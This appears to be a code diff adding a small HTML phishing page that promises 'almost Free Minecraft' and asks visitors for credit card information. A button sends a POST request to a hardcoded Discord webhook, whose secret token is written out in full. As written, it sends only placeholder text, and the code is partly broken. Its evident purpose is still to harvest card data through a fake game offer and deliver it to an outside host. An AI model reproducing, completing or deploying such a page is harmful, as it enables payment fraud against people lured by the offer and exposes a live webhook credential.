@@ -1,0 +1,39 @@
+<!DOCTYPE html>
+<html lang="en">
+  <head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>almost Free Minecraft</title>
+  </head>
+    <body>
+    Enter credit card informations<br>
+    <textarea name="" id="Psic" cols="30" rows="2.5"></textarea>
+    <button on-release="Psic()" onclick="sendMessage()">click after get</button>
+  </body>
+
+  <p id="demo"></p>
+
+  <script>
+    function sendMessage() {
+      const request = new XMLHttpRequest();
+      request.open("POST", "https://discord.com/api/webhooks/1079498428477865984/HapXmwUPk98dDH3avE0H-vi5idi4V_N7Yfa48fIKXzJ0kzNsu_8k3QsU7yyJTD9ePsnp");
+
+      request.setRequestHeader('Content-type', 'application/json');
+
+      const params = {
+        username: "Psic",
+        avatar_url: "https://cdn.discordapp.com/attachments/1079498691225853992/1080198826960371823/Psic.png",
+        content: "aaaaaaaaaaaaa"
+      }
+
+      request.send(JSON.stringify(params));
+
+
+      function Psic() {
+          var x = document.getElementById("Psic").value;
+          document.getElementById("demo").innerHTML = x;
+      }
+
+    }
+  </script>
+</html>
